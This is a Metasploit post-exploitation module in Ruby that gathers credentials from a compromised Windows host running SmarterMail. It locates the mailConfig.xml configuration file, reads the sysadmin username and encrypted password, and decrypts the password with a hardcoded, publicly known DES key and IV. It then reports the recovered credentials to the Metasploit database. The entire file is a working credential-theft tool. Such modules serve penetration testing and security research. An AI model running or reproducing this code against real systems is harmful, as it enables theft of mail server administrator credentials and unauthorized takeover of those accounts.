##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(
      info,
      'Name'          => 'Windows Gather SmarterMail Password Extraction',
      'Description'   => %q{
        This module extracts and decrypts the sysadmin password in the
        SmarterMail 'mailConfig.xml' configuration file. The encryption
        key and IV are publicly known.

        This module has been tested successfully on SmarterMail versions
        10.7.4842 and 11.7.5136.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [
        'Joe Giron',                           # Discovery and PoC (@theonlyevil1)
        'Brendan Coles <bcoles[at]gmail.com>', # Metasploit
        'sinn3r'                               # shell session support
      ],
      'References'    =>
        [
          ['URL', 'http://www.gironsec.com/blog/tag/cracking-smartermail/']
        ],
      'Platform'      => ['win'],
      'SessionTypes'  => ['meterpreter', 'shell']
    ))
  end

  def r_host
    if session.type =~ /meterpreter/
      session.sock.peerhost
    else
      session.session_host
    end
  end

  def peer
    if session.type =~ /meterpreter/
      "#{r_host} (#{sysinfo['Computer']})"
    else
      r_host
    end
  end

  #
  # Decrypt DES encrypted password string
  #
  def decrypt_des(encrypted)
    return nil if encrypted.nil?
    decipher = OpenSSL::Cipher::DES.new
    decipher.decrypt
    decipher.key = "\xb9\x9a\x52\xd4\x58\x77\xe9\x18"
    decipher.iv  = "\x52\xe9\xc3\x9f\x13\xb4\x1d\x0f"
    decipher.update(encrypted) + decipher.final
  end

  #
  # Find SmarterMail 'mailConfig.xml' config file
  #
  def get_mail_config_path
    found_path = ''
    drive = expand_path('%SystemDrive%').strip

    ['Program Files (x86)', 'Program Files'].each do |program_dir|
      path = %Q|#{drive}\\#{program_dir}\\SmarterTools\\SmarterMail\\Service\\mailConfig.xml|.strip
      vprint_status "#{peer} - Checking for SmarterMail config file: #{path}"
      if file?(path)
        found_path = path
        break
      end
    end

    found_path
  end

  #
  # Retrieve username and decrypt encrypted password string from the config file
  #
  def get_smartermail_creds(path)
    result = {}
    data   = ''

    vprint_status "#{peer} - Retrieving SmarterMail sysadmin password"
    begin
      data = read_file(path)
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error "#{peer} - Failed to download #{path} - #{e.to_s}"
      return result
    end

    if data.blank?
      print_error "#{peer} - Configuration file is empty."
      return result
    end

    username = data.match(/<sysAdminUserName>(.+)<\/sysAdminUserName>/)
    password = data.match(/<sysAdminPassword>(.+)<\/sysAdminPassword>/)
    result['username'] = username[1] unless username.nil?
    result['password'] = decrypt_des(Rex::Text.decode_base64(password[1])) unless password.nil?
    result
  end

  #
  # Find the config file, extract the encrypted password and decrypt it
  #
  def run
    # check for SmartMail config file
    config_path = get_mail_config_path
    if config_path.blank?
      print_error "#{peer} - Could not find SmarterMail config file"
      return
    end

    # retrieve username and decrypted password from config file
    result = get_smartermail_creds(config_path)
    if result['password'].nil?
      print_error "#{peer} - Could not decrypt password string"
      return
    end

    # report result
    user = result['username']
    pass = result['password']
    print_good "#{peer} - Found Username: '#{user}' Password: '#{pass}'"
    report_auth_info(
      :host  => r_host,
      :sname => 'http',
      :user  => user,
      :pass  => pass,
      :source_id   => session.db_record ? session.db_record.id : nil,
      :source_type => 'vuln')
  end
end
